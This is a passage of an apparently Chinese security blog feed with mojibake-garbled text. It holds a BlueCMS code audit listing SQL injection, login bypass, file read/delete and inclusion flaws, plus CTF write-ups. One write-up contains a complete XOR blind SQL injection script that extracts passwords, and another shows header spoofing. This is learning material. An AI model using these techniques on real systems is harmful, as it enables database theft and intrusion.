¹ç›®å½•ä¸‹çš„<code>index.php</code>æ–‡ä»¶å…¥æ‰‹ï¼Œå®ƒæ˜¯æ•´ä¸ªç¨‹åºçš„å…¥å£ï¼Œä¸€å¼€å§‹å®ƒåŠ è½½äº†ä¸¤ä¸ªphpæ–‡ä»¶ï¼Œä¹‹åå†åˆ†æè¿™ä¸¤ä¸ªæ–‡ä»¶ä½œç”¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092735808.png" alt="image-20210830092735808"></p><p>ç„¶åå°±æ˜¯é¡µé¢çš„å„ä¸ªæ¿å—ä¿¡æ¯çš„æŸ¥è¯¢ä¸å±•ç¤ºï¼Œæ¯”å¦‚æ–°é—»åˆ†ç±»åˆ—è¡¨çš„å±•ç¤ºï¼Œæœ€æ–°åˆ†ç±»ä¿¡æ¯ç­‰ï¼Œæœ€ååˆ©ç”¨<code>smarty</code>æ¨¡æ¿æ¸²æŸ“å±•ç¤ºé¡µé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092957266.png" alt="image-20210830092957266"></p><p><code>include/common.inc.php</code>ï¼Œå¼€å§‹ä¹Ÿæ˜¯åŒ…å«äº†ä¸€å †PHPæ–‡ä»¶ï¼Œç„¶åå¯¹å•å¼•å·è¿‡æ»¤ï¼Œä½†æ˜¯è¿™ä¸ªCMSä½¿ç”¨çš„æ˜¯GKBç¼–ç ï¼Œå¯èƒ½ä¼šå­˜åœ¨å®½å­—èŠ‚ç»•è¿‡å¹¶ä¸”è¿™é‡Œå¹¶æ²¡æœ‰å¯¹<code>$_SERVER</code>è¿›è¡Œè¿‡æ»¤å®ƒä¹Ÿæ˜¯å¤–éƒ¨å¯æ§çš„æ•°æ®</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830093831941.png" alt="image-20210830093831941"></p><p>åé¢å°±æ˜¯è¿æ¥æ•°æ®åº“æ“ä½œï¼Œç„¶åå°±æ˜¯ä¸€äº›å…¶ä»–å·¥ä½œäº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094358872.png" alt="image-20210830094358872"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094832335.png" alt="image-20210830094832335"></p><p><code>include/common.fun.php</code> è¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†å¾ˆå¤šå‡½æ•°æä¾›è°ƒç”¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095002133.png" alt="image-20210830095002133"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095038504.png" alt="image-20210830095038504"></p><p>è¿˜æœ‰ä¸€å †å‡½æ•°å°±ä¸ä¸€ä¸€åˆ—å‡ºæ¥äº†</p><p>åå°åŠŸèƒ½æŸ¥çœ‹</p><p><code>admin/index.php</code> è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤šçš„ä¸œè¥¿ï¼Œä¸»è¦å°±æ˜¯æé†’ç”¨æˆ·åˆ é™¤å®‰è£…æ–‡ä»¶ï¼Œæ—¥å¿—è¯»å–ï¼Œè·å–é…ç½®ä¿¡æ¯ç­‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830101752484.png" alt="image-20210830101752484"></p><p>ä¸»è¦çš„åŠŸèƒ½é€»è¾‘éƒ¨åˆ†æ˜¯åœ¨<code>admin/include/common.inc.php</code>æ–‡ä»¶ä¸­å¤„ç†çš„ï¼Œå®ƒæœ‰æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ï¼Œç™»å½•éªŒè¯ç­‰åŠŸèƒ½</p><p>è¿™é‡Œç”¨æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102017217.png" alt="image-20210830102017217"></p><p><code>admin/login.php</code>ç”¨æˆ·ç™»å½•ç•Œé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102950559.png" alt="image-20210830102950559"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102935926.png" alt="image-20210830102935926"></p><blockquote><p>æ„Ÿè§‰åªè¦ç»•è¿‡äº†å•å¼•å·ï¼Œè¿™ä¸ªCMSå°±åˆ°å¤„æ˜¯SQLæ¼æ´äº†</p></blockquote><p>å…¶ä»–çš„æ–‡ä»¶å°±æ˜¯ä¸€äº›æ‚ä¸ƒæ‚å…«çš„æ¼æ´äº†ï¼Œå¯ä»¥å…ˆæš‚æ—¶æ”¾ç€</p><h3 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h3><p><code>ad_js.php</code> è¿™ä¸ªæ–‡ä»¶ä¸­å¯¹äºsqlè¯­å¥çš„è¿‡æ»¤æ²¡æœ‰æ•ˆæœï¼Œå› ä¸ºæ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830091607034.png" alt="image-20210830091607034"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830104231347.png" alt="image-20210830104231347"></p><p><img src="D:\markdown\image-20210830104259328.png" alt="image-20210830104259328"></p><h3 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h3><p>ç•™è¨€æ¿å’Œè¯„è®ºå¤„éƒ½å­˜åœ¨è¿™ä¸ªæ³¨å…¥æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110029339.png" alt="image-20210830110029339"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110111423.png" alt="image-20210830110111423"></p><p>æ¼æ´éªŒè¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112351558.png" alt="image-20210830112351558"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112401719.png" alt="image-20210830112401719"></p><h3 id="SQLæ³¨å…¥3"><a href="#SQLæ³¨å…¥3" class="headerlink" title="SQLæ³¨å…¥3"></a>SQLæ³¨å…¥3</h3><blockquote><p>å®½å­—èŠ‚æ³¨å…¥</p></blockquote><p>æ­£å¸¸è¾“å…¥é”™è¯¯çš„å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113226858.png" alt="image-20210830113226858"></p><p>æˆåŠŸåˆ©ç”¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´è¿›å…¥ç³»ç»Ÿ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113438244.png" alt="image-20210830113438244"></p><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><blockquote><p>è¿™ä¸ªæ˜¯åœ¨åå°çš„æ¼æ´ï¼Œåå°ç”±äºé»˜è®¤æ˜¯ç®¡ç†å‘˜æ“ä½œçš„æ‰€ä»¥æƒé™éƒ½æ¯”è¾ƒå¤§ï¼Œæ•æ„Ÿæ“ä½œå¾ˆå¤šï¼Œå­˜åœ¨çš„æ¼æ´å°±ä¼šå¾ˆå¤š</p></blockquote><p>åå°æ¨¡æ¿ç®¡ç†è¿™é‡Œå¯ä»¥è¯»å–å’Œä¿®æ”¹æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä¿®æ”¹å…¶ä»–æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830123320939.png" alt="image-20210830123320939"></p><p>å…·ä½“å®Œæˆæ“ä½œçš„PHPæ–‡ä»¶<code>admin/tpl_manage.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130636799.png" alt="image-20210830130636799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130657999.png" alt="image-20210830130657999"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830125516798.png" alt="image-20210830125516798"></p><blockquote><p>ä½¿ç”¨ç›®å½•ç©¿è¶Šå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶å†…å®¹å¹¶ä¸”ä¿®æ”¹</p></blockquote><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p><del>æ‰¾åˆ°æ“ä½œæ—¥å¿—ç®¡ç†ï¼Œè¿™é‡Œæœ‰ä¸ªåˆ é™¤æ“ä½œï¼Œæˆ‘ä»¬å°è¯•åˆ†æä»£ç çœ‹çœ‹æ˜¯å¦å¯ä»¥é€ æˆä»»æ„æ–‡ä»¶åˆ é™¤</del></p><p>åœ¨<code>user.php</code>ä¸­å‘ç°äº†ä¸€ä¸ªæ–‡ä»¶åˆ é™¤çš„æ“ä½œ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140714576.png" alt="image-20210830140714576"></p><p>è¿™ä¸ªå¾ˆä»»æ„å®ç°ï¼Œç›´æ¥æŒ‰ç…§é€»è¾‘å»æ‰ä¸€äº›å‚æ•°ï¼Œä¹‹åå°±å¯ä»¥æ‰§è¡Œåˆ é™¤æ“ä½œäº†</p><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>åœ¨ç”¨æˆ·ä¿®æ”¹å¤´åƒåŠŸèƒ½å¤„ä¸Šä¼ ä»»æ„æºå¸¦åé—¨çš„jpgæ–‡ä»¶ï¼Œè·å–åˆ°è·¯å¾„<code>data/upload/face_pic/16303030511.jpg</code>ç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140130531.png" alt="image-20210830140130531"></p><blockquote><p>%00æˆªæ–­ï¼šæ¡ä»¶ï¼šmagic_quotes_gpc = Offï¼ŒPHPç‰ˆæœ¬&lt;5.3.4</p><p>è·¯å¾„é•¿åº¦é˜¶æ®µï¼šæ¡ä»¶ï¼šwindows ä¸‹ç›®å½•è·¯å¾„æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºéƒ¨åˆ†å°†ä¸¢å¼ƒï¼›linux ä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºé•¿åº¦å°†ä¸¢å¼ƒï¼›PHPç‰ˆæœ¬&lt;5.2.8</p></blockquote><p>è¿™é‡Œç”±äºPHPç‰ˆæœ¬ä¸åˆé€‚å°±å…ˆæ²¡æœ‰ç»§ç»­æµ‹è¯•äº†</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªCMSæ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„é€‚åˆå…¥é—¨å®¡è®¡çš„ï¼Œè¿™é‡Œé¢çš„æ¼æ´ä¸éš¾ï¼Œä¸»è¦æ˜¯éœ€è¦æŒæ¡å®¡è®¡ä»£ç çš„æ€è·¯ä¸æ–¹æ³•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BlueCMS&quot;&gt;&lt;a href=&quot;#BlueCMS&quot; class=&quot;headerlink&quot; title=&quot;BlueCMS&quot;&gt;&lt;/a&gt;BlueCMS&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;BlueCMS__v1.6_sp1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>äºŒåˆ†æ³•ç›²æ³¨</title>
    <link href="http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-01-18T15:26:54.000Z</published>
    <updated>2021-09-27T03:52:35.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h1><p>æŸ¥çœ‹ç¬¬äº”ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œå‘ç°æç¤º</p><p><img src="https://i.loli.net/2021/01/11/3dq6OA5SfCjtpN9.png" alt="image-20210111205316927"></p><p>è®¿é—®ä¸€ä¸‹ç¬¬å…­ä¸ªæ•°å­—</p><p><img src="https://i.loli.net/2021/01/11/HRlzg9heOyEaQtq.png" alt="image-20210111205350930"></p><blockquote><p>çœ‹äº†ä¸€ä¸‹wpï¼Œè¿™é‡Œæç¤ºéœ€è¦ä½¿ç”¨å¼‚æˆ–ç›²æ³¨</p></blockquote><p>ä½¿ç”¨ç›²æ³¨æŸ¥çœ‹æ•°æ®åº“çš„é•¿åº¦</p><p><img src="https://i.loli.net/2021/01/11/qIypWltXKP7g1iJ.png" alt="image-20210111205926348"></p><blockquote><p>:open_mouth: æ˜¯ä¸æ˜¯å“ªé‡Œå¼„é”™äº†</p><p>æ£€æŸ¥ä¹‹åå‘ç°æˆ‘æŠŠå¼‚æˆ–çš„åŸºæœ¬åˆ¤æ–­å®šç†éƒ½å¼„é”™äº† æˆ‘æ˜¯æ†¨æ†¨</p><p>ä¿®æ”¹payloadï¼Œå†™è„šæœ¬ç›²æ³¨</p></blockquote><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haskell">// è„šæœ¬<br>// äºŒåˆ†æ³•<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-title">url</span> = <span class="hljs-string">&quot;http://8b15efee-ef59-4f8e-83dd-660824e442eb.node3.buuoj.cn/search.php&quot;</span><br><span class="hljs-title">flag</span> = &#x27;&#x27;<br><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>    hight = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">31</span><br>    while hight&gt;=low:<br>        mid = (hight+low)// <span class="hljs-number">2</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&#x27;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>(<span class="hljs-title">database</span>(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125;  # æŸ¥è¡¨å  geek</span><br>        # <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">tables</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_schema</span>)=&#x27;<span class="hljs-title">geek&#x27;</span>),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # æŸ¥åº“å <span class="hljs-type">F1naI1y</span></span><br>        #<span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">column_name</span>))<span class="hljs-title">from</span>(<span class="hljs-title">information_schema</span>.<span class="hljs-title">columns</span>)<span class="hljs-title">where</span>(<span class="hljs-title">table_name</span>)=&#x27;<span class="hljs-type">F1naI1y</span>&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; #æŸ¥å­—æ®µ id userh</span><br>         <span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-title">id&#x27;</span>:&quot;0^(<span class="hljs-title">ascii</span>(<span class="hljs-title">substr</span>((<span class="hljs-title">select</span>(<span class="hljs-title">group_concat</span>(<span class="hljs-title">password</span>))<span class="hljs-title">from</span>(<span class="hljs-title">geek</span>.<span class="hljs-type">F1naI1y</span>)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(<span class="hljs-title">i</span>,<span class="hljs-title">mid</span>)&#125; # æŸ¥å­—æ®µå€¼</span><br>        response = requests.get(url,params=<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>        s = response.text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;others~~~&quot;</span> <span class="hljs-keyword">in</span> s:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            hight = mid - <span class="hljs-number">1</span><br>    f = int((low+hight+<span class="hljs-number">1</span>))//<span class="hljs-number">2</span><br>     <span class="hljs-keyword">if</span>(f==<span class="hljs-number">127</span> or f==<span class="hljs-number">31</span>):<br>         break<br>    flag = flag + chr(f)<br>    print(flag)<br><br></code></pre></td></tr></table></figure><blockquote><p>å¯èƒ½æ˜¯ç”±äºbuuå¹³å°çš„åŸå› ï¼Œè„šæœ¬æ‰§è¡Œè¿‡ä¹…å°±ä¼šå‡ºç°é”™è¯¯ï¼Œä½†æ˜¯ä¸»è¦æ˜¯è¦å­¦ä¼šå¯¹sqlç›²æ³¨çš„è„šæœ¬ç¼–å†™ï¼Œå¹¶ä¸”ç†Ÿç»ƒæŒæ¡äºŒåˆ†æ³•</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>HTTPç‰¹æ®Šè¯·æ±‚å¤´</title>
    <link href="http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <id>http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
    <published>2021-01-18T13:57:40.000Z</published>
    <updated>2021-01-18T13:59:45.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ€è¿‘åšäº†ä¸€é“CTFçš„é¢˜ï¼Œé‡Œé¢åº”ç”¨äº†httpçš„å„ç§å¤´ï¼Œè®°å½•ä¸‹æ¥å­¦ä¹ å­¦ä¹ </p></blockquote><h1 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h1><h3 id="æ‰“å¼€é¢˜ç›®"><a href="#æ‰“å¼€é¢˜ç›®" class="headerlink" title="æ‰“å¼€é¢˜ç›®"></a>æ‰“å¼€é¢˜ç›®</h3><p><img src="https://i.loli.net/2020/12/20/NqxatShcbRrQwyj.png" alt="image-20201220223807400"></p><blockquote><p>å°è¯•å¼±å£ä»¤ç™»å½•ä¸SQLæ³¨å…¥</p></blockquote><p>æŠ“åŒ…</p><p><img src="https://i.loli.net/2020/12/20/Kwq5lz42gfh9oCA.png" alt="image-20201220224157732"></p><p>ä¿®æ”¹æ—¶é—´ï¼Œç„¶åå‘ç°æ–°çº¿ç´¢</p><p><img src="https://i.loli.net/2020/12/20/OWMv6lu5HycxE7g.png" alt="image-20201220224129130"></p><p>ä½¿ç”¨**<em>Client-ip: 127.0.0.1**</em> ,åˆå‡ºç°æ–°çš„çº¿ç´¢</p><p><img src="https://i.loli.net/2020/12/20/8W1zlVCqOQEtvN6.png" alt="image-20201220224438421"></p><p>ä½¿ç”¨*** Referer: gem-love.com *** åˆæœ‰æ–°æç¤º</p><p><img src="https://i.loli.net/2020/12/20/ZbgB52qGpS6n8Xl.png" alt="image-20201220224558708"></p><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œéœ€è¦ä½¿ç”¨Commodo 64çš„å…¨ç§°ï¼ŒCommodore 64ï¼›</p><p><strong>* User-Agentï¼š Commodore 64*</strong> </p><p><img src="https://i.loli.net/2020/12/20/rVhP4yswMF38g1k.png" alt="image-20201220225317596"></p><p>æŒ‡å®šé‚®ç®±*** From: <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#108;&#x6f;&#x76;&#101;&#x2e;&#99;&#111;&#109;">&#114;&#111;&#x6f;&#116;&#64;&#103;&#x65;&#x6d;&#x2d;&#108;&#x6f;&#x76;&#101;&#x2e;&#99;&#111;&#109;</a>***</p><p><img src="https://i.loli.net/2020/12/20/eWg5bEnzAyQfTkY.png" alt="image-20201220225553050"></p><p>æŒ‡å®šæœåŠ¡å™¨**<em>Via: y1ng.vip**</em></p><p><img src="https://i.loli.net/2020/12/20/AxtY9Kzbp2UhNiZ.png" alt="image-20201220225711978"></p><p>base64è§£ç å³å¯</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™ä¸ªé¢˜ç›®æœ¬èº«ä¸éš¾ï¼Œä¸»è¦è€ƒçš„å°±æ˜¯**<em>è¯·æ±‚é¦–éƒ¨å­—æ®µ**</em>çš„ç†Ÿç»ƒä½¿ç”¨</p><table><thead><tr><th>Header</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>Accept</td><td>æŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿæ¥æ”¶çš„å†…å®¹ç±»å‹</td></tr><tr><td>Via</td><td>é€šçŸ¥ä¸­é—´ç½‘å…³æˆ–ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œé€šä¿¡åè®®</td></tr><tr><td>Referer</td><td>å…ˆå‰çš„ç½‘å€ï¼Œå½“å‰è¯·æ±‚çš„ç½‘é¡µç´§éšå…¶åï¼Œå³æ¥è·¯</td></tr><tr><td>Range</td><td>åªè¯·æ±‚å®ä½“çš„ä¸€éƒ¨åˆ†ï¼ŒæŒ‡å®šèŒƒå›´</td></tr><tr><td>From</td><td>å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·çš„Email</td></tr><tr><td>Cookie</td><td>å­˜å‚¨cookieä¿¡æ¯</td></tr><tr><td>User-Agent</td><td>åŒ…å«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td>TE</td><td>å®¢æˆ·ç«¯æ¥å—çš„ä¼ è¾“ç¼–ç ï¼Œé€šçŸ¥æœåŠ¡å™¨æ¥å—å°¾åŠ å¤´ä¿¡æ¯</td></tr><tr><td>Host</td><td>æŒ‡å®šè¯·æ±‚çš„æœåŠ¡å™¨çš„åŸŸåå’Œç«¯å£å·</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æœ€è¿‘åšäº†ä¸€é“CTFçš„é¢˜ï¼Œé‡Œé¢åº”ç”¨äº†httpçš„å„ç§å¤´ï¼Œè®°å½•ä¸‹æ¥å­¦ä¹ å­¦ä¹ &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>XXEæ¼æ´</title>
    <link href="http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-17T14:45:34.000Z</published>
    <updated>2021-01-17T14:46:11.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>XXEæ¼æ´</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Injection)å…¨ç§°ä¸º<span class="hljs-type">XML</span>å¤–éƒ¨å®ä½“æ³¨å…¥<br><br><span class="hljs-type">XML</span>ï¼šè®¾è®¡ç”¨æ¥ä¼ è¾“ä¸æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹<br>HTMLï¼šè®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚<br><br><span class="hljs-type">XML</span>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDã€‚XXEæ¼æ´æ‰€åœ¨çš„åœ°æ–¹<br>XXEæ¼æ´çš„è§¦å‘ç‚¹ä¸€èˆ¬å‘ç”Ÿåœ¨å¯ä»¥ä¸Šä¼ <span class="hljs-type">XML</span>æ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„<span class="hljs-type">XML</span>æ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æ¶æ„çš„<span class="hljs-type">xml</span>æ–‡ä»¶è¢«ä¸Šä¼ ã€‚<br></code></pre></td></tr></table></figure><h4 id="XMLåŸºæœ¬äº†è§£"><a href="#XMLåŸºæœ¬äº†è§£" class="headerlink" title="XMLåŸºæœ¬äº†è§£"></a>XMLåŸºæœ¬äº†è§£</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml">xmlçš„æ³¨æ„è¦æ±‚ï¼š<br>1. æ‰€æœ‰xmlå…ƒç´ éƒ½å¿…é¡»æœ‰å…³é—­æ ‡ç­¾<br>2. xmlæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ<br>3. xmlå¿…é¡»æ­£ç¡®åµŒå¥—<br>4. 